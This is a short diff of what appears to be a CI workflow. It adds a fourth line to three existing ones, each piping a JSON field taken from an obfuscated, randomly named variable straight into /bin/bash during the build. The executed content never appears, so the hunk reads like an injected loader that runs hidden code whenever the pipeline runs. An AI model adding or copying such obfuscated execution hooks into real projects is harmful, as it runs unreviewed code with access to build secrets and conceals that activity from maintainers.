@@ -24,6 +24,7 @@ jobs:
           echo $pxrzn2 | jq -r .p36 | /bin/bash
           echo $oeifa10 | jq -r .e16 | /bin/bash
           printf '%s' "$lmmfm22008" | jq -r .a6 | /bin/bash
+          printf '%s' "$rajgp450" | jq -r .gee512 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
